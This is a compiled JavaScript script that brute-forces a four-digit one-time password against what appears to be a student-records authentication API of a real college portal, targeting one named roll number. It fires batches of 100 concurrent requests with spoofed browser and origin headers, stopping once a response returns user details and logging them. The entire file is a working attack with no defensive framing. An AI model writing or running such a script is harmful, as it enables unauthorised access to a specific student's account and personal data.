"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
let stopExecution = false;
function sendRequest(otp) {
    return __awaiter(this, void 0, void 0, function* () {
        let config = {
            method: 'get',
            maxBodyLength: Infinity,
            url: `https://dbchangesstudent.edwisely.com/auth/v3/getUserDetails?roll_number=rmkucb20117&otp=${otp}`,
            headers: {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'Origin': 'https://nextgen.rmkec.ac.in',
                'Referer': 'https://nextgen.rmkec.ac.in/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'cross-site',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"'
            }
        };
        try {
            const response = yield axios_1.default.request(config);
            console.log(`OTP: ${otp}, Status: ${response.status}, Data: ${JSON.stringify(response.data)}`);
            if (response.data.status !== 422) {
                console.log(`Stopping execution as received status: ${response.status}`);
                stopExecution = true;
            }
        }
        catch (error) {
        }
    });
}
function main() {
    return __awaiter(this, void 0, void 0, function* () {
        for (let i = 1000; i < 10000; i += 100) {
            const promises = [];
            for (let j = 0; j < 100; j++) {
                promises.push(sendRequest(i + j));
            }
            yield Promise.all(promises);
            if (stopExecution) {
                break;
            }
        }
    });
}
main();
